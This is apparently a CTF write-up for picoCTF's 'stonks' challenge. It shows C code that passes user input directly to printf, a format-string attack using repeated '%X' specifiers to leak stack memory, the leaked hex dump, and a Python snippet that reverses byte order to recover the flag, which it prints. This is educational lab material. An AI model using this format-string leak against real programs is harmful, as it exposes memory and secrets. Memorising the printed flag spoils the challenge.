## description 

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine 
learning. I wouldn't believe you if you told me it's unsecure!

## solution
we are provided with the code. i looked through it for any inputs that i could give to program, and there was a spot were i could do some binary exploitation in order to get response with some memory 
```C 
char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);
```
i want to  get output in hexadecimal so i put in symbols "%X"
the more i put the longer the output
reponse i got : 
```
8AA7410804B00080489C3F7FB3D80FFFFFFFF18AA5160F7FC1110F7FB3DC708AA618028AA73F08AA74106F6369707B465443306C5F49345F74356D5F6C6C306D5F795F79336E3463646261653532FFE5007DF7FEEAF8F7FC1440E6D06E0010F7E50CE9F7FC20C0F7FB35C0F7FB3000FFE5C568F7E4168DF7FB35C08048ECAFFE5C5740F7FD5F09804B000F7FB3000F7FB3E20FFE5C5A8F7FDBD50F7FB4890E6D06E00F7FB3000804B000FFE5C5A88048C868AA5160FFE5C594FFE5C5A88048BE9F7FB33FC0FFE5C65CFFE5C654118AA5160E6D06E00FFE5C5C000F7DF6FA1F7FB3000F7FB30000
```
if i convert to string : 
```
Š§A°�€Hœ?³ØÿÿÿñŠ¥Á³ÜpŠ¦Š§?ªtocip{FTC0l_I4_t5m_ll0m_y_y3n4cdbae52ÿå�}÷þêø÷ü@æÐn�÷åé÷ü À÷û5À÷û0�ÿåÅh÷ä÷û5À€Hì¯þ\W@÷ý_	€K�³�³âþ\ZÛÕ´‰mà³�°�ÿåÅ¨€HÈhªQ`ÿåÅ”ÿåÅ¨€H¾Ÿ³?ÀÿåÆ\ÿåÆTŠ¥màþ\\�}öú³�³��??
```
i can see the flag but its in reverse order (memory is written in little endian then)

now just put every 4 characters bacwards to get the flag : 
```Python 
mixed_flag = "ocip{FTC0l_I4_t5m_ll0m_y_y3n4cdbae52ÿå�}"  
z=0  
for x in range(0,len(mixed_flag),4):  
    part = mixed_flag[x:x+4]  
    reversed = part[::-1]  
    print(reversed)
```
picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}
